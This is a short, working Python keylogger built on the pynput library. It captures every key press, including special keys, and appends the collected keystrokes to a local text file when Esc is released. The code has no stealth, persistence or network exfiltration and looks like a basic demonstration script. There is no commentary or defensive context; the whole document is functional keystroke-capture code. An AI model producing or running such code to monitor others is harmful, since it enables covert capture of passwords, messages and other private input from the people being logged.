from pynput import keyboard

log_file = "keylog_with_stop.txt"
keys = []

def on_press(key):
    try:
        keys.append(key.char)
    except AttributeError:
        keys.append(str(key))

def on_release(key):
    if key == keyboard.Key.esc:
        with open(log_file, "a") as f:
            f.write(''.join(keys) + "\n")
        return False  

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
